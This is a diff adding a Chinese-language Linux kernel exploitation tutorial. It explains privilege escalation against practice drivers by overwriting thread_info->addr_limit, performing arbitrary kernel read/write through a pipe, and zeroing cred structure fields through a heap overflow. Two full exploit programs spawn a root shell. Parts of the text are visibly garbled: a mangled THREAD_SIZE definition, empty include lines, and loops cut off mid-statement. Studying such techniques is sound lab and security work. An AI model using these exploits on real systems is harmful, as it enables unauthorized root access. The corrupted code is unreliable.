@@ -1,0 +1,209 @@
+[arch/x86/include/asm/page_64_types.h](https://elixir.bootlin.com/linux/v4.4.73/source/arch/x86/include/asm/page_64_types.h#L11)
+    #ifdef CONFIG_KASAN
+    #define KASAN_STACK_ORDER 1
+    #else
+    #define KASAN_STACK_ORDER 0
+    #endif
+    #define THREAD_SIZE_ORDER   (2 + KASAN_STACK_ORDER)
+    #define THREAD_SIZE  (PAGE_SIZE >> hex(~(0x4000-1)&0xffffffffffffffff)
+    '0xffffffffffffc000L'
+所以 `thread_info` 的地址就是 `p_stack&0xFFFFFFFFFFFFC000` , 然后利用 `put_user` 传递给 用户态。
+#### 修改 thread_info->addr_limit
+`thread_info->addr_limit` 用于限制用户态程序能访问的地址的最大值，如果把它修改成 `0xffffffffffffffff`
+，我们就可以读写整个内存空间了 包括 **内核空间**
+    struct thread_info {
+        struct task_struct  *task;      /* main task structure */
+        __u32           flags;      /* low level flags */
+        __u32           status;     /* thread synchronous flags */
+        __u32           cpu;        /* current CPU */
+        mm_segment_t        addr_limit;
+        unsigned int        sig_on_uaccess_error:1;
+        unsigned int        uaccess_err:1;  /* uaccess failed */
+    };
+在 `thread_info` 偏移 `0x18` （64位）处就是 `addr_limit` ， 它的类型为 `long`。
+在驱动的源码中， **模拟** 修改 了 `thread_info->addr_limit` 的操作，
+    memset(&info->addr_limit, 0xff, 0x8);
+执行完后，我们就可以读写任意内存了。
+#### 利用 pipe 实现任意地址读写
+修改 `thread_info->addr_limit` 后，我们还不能直接的进行任意地址读写，需要使用 `pipe` 来中转一下，具体的原因以后再研究。
+    int pipefd[2];
+    //dest 数据的写入位置， src 数据来源， size 大小
+    int kmemcpy(void *dest, void *src, size_t size)
+    {
+        write(pipefd[1], src, size);
+        read(pipefd[0], dest, size);
+        return size;
+    }
+先用 `pipe(pipefd)` 初始化好 `pipefd` ， 然后使用 `kmemcpy` 就可以实现任意地址读写了。
+> 如果是泄露内核数据的话， `dest` 为 内核地址， `src` 为 内核地址，同时要关闭 `smap`
+>
+> 如果是对内核数据进行写操作， `dest` 为 内核地址， `src` 为 用户态地址
+#### 修改 task_struct->real_cred
+我们现在已经有了`thread_info` 的地址，而且可以对内核进行任意读写，于是通过 修改 `task_struct->real_cred` 和
+`task_struct->cred` 进行提权。
+  * 首先通过 `thread_info` 的地址，拿到 `task_struct` 的地址 （ `thread_info->task`)
+  * 通过 `task_struct->real_cred` 和 `task_struct->cred`相对于 `task_struct` 的偏移，拿到 它们的地址.
+  * 修改 `task_struct->real_cred` 中从开始 一直 到 `fsuid` 字段（大小为 `0x1c`) 为 `0`.
+  * 修改 `task_struct->cred = task_struct->real_cred`
+  * 执行 `system("sh")`, 获取 `root` 权限的 `shell`
+> `gdb`中获取 `real_cred` 的偏移
+>  
+>  
+>     p &((struct task_struct*)0)->real_cred
+完整 `exp`
+    #include 
+    #include 
+    #include 
+    struct param
+    {
+        size_t len;
+        char* buf;
+        char* addr;
+    };
+    int pipefd[2];
+    int kmemcpy(void *dest, void *src, size_t size)
+    {
+        write(pipefd[1], src, size);
+        read(pipefd[0], dest, size);
+        return size;
+    }
+    int main(void)
+    {
+        int fd;
+        char buf[16];
+        fd = open("/dev/arw", O_RDWR);
+        if (fd == -1) {
+            printf("open hello device failed!\n");
+            return -1;
+        }
+        struct param p;
+        ioctl(fd, 5, &p);
+        printf("got thread_info: %p\n", p.addr);
+        char * info = p.addr;
+        int ret_val = pipe(pipefd);
+        if (ret_val real_cred
+        // 0x5a8
+        kmemcpy(buf, task_addr+0x5a8, 16);
+        char* real_cred = (void *)(*(long *)buf);
+        printf("task_addr: %p\n", task_addr);
+        printf("real_cred: %p\n", real_cred);
+        char* cred_ids = malloc(0x1c);
+        memset(cred_ids, 0, 0x1c);
+        // 修改 real_cred 
+        kmemcpy(real_cred, cred_ids, 0x1c);
+        // 修改 task->cred = real_cred
+        kmemcpy(real_cred+8, &real_cred, 8);
+        system("sh");
+        return 0;
+    }
+运行测试
+`gid` 和 `groups`没有为 `0`， 貌似是 `qemu` 的 特点导致的？因为它们后面的字段能被成功设置为 `0`
+**参考**
+[LinuxカーネルモジュールでStackjackingによるSMEP+SMAP+KADR回避をやってみる](http://inaz2.hatenablog.com/entry/2015/03/27/021422)
+### 利用 `set_fs`
+在内核中 `set_fs` 是一个用于设置 `thread_info->addr_limit` 的 宏，利用这个，再加上一些条件，可以直接修改
+`thread_info->addr_limit` , 具体可以看 [Android PXN绕过技术研究](http://t.cn/RoGHAol)
+## 修改 cred提权
+本节使用 `heap_bof` 中的代码作为示例。
+漏洞请看 **Rop-By-Heap-Vulnerability** 小结。
+### 介绍
+在内核中用 `task_struct` 表示一个进程的属性， 在创建一个进程的时候同时会分配 `cred` 结构体用于标识进程的权限。
+    struct cred {
+        atomic_t    usage;
+    #ifdef CONFIG_DEBUG_CREDENTIALS
+        atomic_t    subscribers;    /* number of processes subscribed */
+        void        *put_addr;
+        unsigned    magic;
+    #define CRED_MAGIC  0x43736564
+    #define CRED_MAGIC_DEAD 0x44656144
+    #endif
+        kuid_t      uid;        /* real UID of the task */
+        kgid_t      gid;        /* real GID of the task */
+        kuid_t      suid;       /* saved UID of the task */
+        kgid_t      sgid;       /* saved GID of the task */
+        kuid_t      euid;       /* effective UID of the task */
+        kgid_t      egid;       /* effective GID of the task */
+        kuid_t      fsuid;      /* UID for VFS ops */
+        kgid_t      fsgid;      /* GID for VFS ops */
+        unsigned    securebits; /* SUID-less security management */
+提权到 `root` 除了调用 `commit_creds(prepare_kernel_cred(0))` 外，我们还可以通过 修改 `cred`
+结构体中 `*id` 的字段 为`0` ，其实就是把 `cred` 结构体从开始一直到 fsuid 的所有字段全部设置为`0`， 这样也可以实现 提权到
+`root` 的目的。
+### 堆溢出为例
+本节就实践一下，前面利用这个驱动的 `uaf` 漏洞，这节就利用 **堆溢出** 。
+要利用堆溢出就要搞清楚内核真正分配给我们的内存大小，这里 `cred` 结构体大小为 `0xa8` （编译一个内核 `gdb`查看之），
+由于向上对齐的特性内核应该会分配 `0xc0` 大小的内存块给我们，测试一下（具体代码可以看最终 `exp`)。
+    // 让驱动分配 10 个 0xa8  的内存块
+        for (int i = 0; i 
+    #include 
+    #include 
+    #include 
+    struct param
+    {
+        size_t len;    // 内容长度
+        char* buf;     // 用户态缓冲区地址
+        unsigned long idx; // 表示 ptr 数组的 索引
+    };
+    int main(void)
+    {
+        int fds[10];
+        int ptmx_fds[0x100];
+        char buf[8];
+        int fd;
+        for (int i = 0; i < 10; ++i)
+        {
+            fd = open("/dev/bof", O_RDWR);
+            if (fd == -1) {
+                printf("open bof device failed!\n");
+                return -1;
+            }
+            fds[i] = fd;
+        }
+        struct param p;
+        p.len = 0xa8;
+        p.buf = malloc(p.len);
+        // 让驱动分配 10 个 0xa8  的内存块
+        for (int i = 0; i < 80; ++i)
+        {
+            p.idx = 1;
+            ioctl(fds[0], 5, &p);  // malloc
+        }
+        printf("clear heap done\n");
+        // 让驱动分配 10 个 0xa8  的内存块
+        for (int i = 0; i < 10; ++i)
+        {
+            p.idx = i;
+            ioctl(fds[i], 5, &p);  // malloc
+        }
+        p.idx = 5;
+        ioctl(fds[5], 7, &p); // free
+        int now_uid;
+        // 调用 fork 分配一个 cred结构体
+        int pid = fork();
+        if (pid < 0) {
+            perror("fork error");
+            return 0;
+        }
+        // 此时 ptr[4] 和 cred相邻
+        // 溢出 修改 cred 实现提权
+        p.idx = 4;
+        p.len = 0xc0 + 0x30;
+        memset(p.buf, 0, p.len);
+        ioctl(fds[4], 8, &p);    
+        if (!pid) {
+            //一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了
+            now_uid = getuid();
+            printf("uid: %x\n", now_uid);
+            if (!now_uid) {
+                // printf("get root done\n");
+                // 权限修改完毕，启动一个shell，就是root的shell了
+                system("/bin/sh");
+            } else {
+                // puts("failed?");
+            }
+        } else {
+            wait(0);
+        }
+        getchar();
+        return 0;
+    }
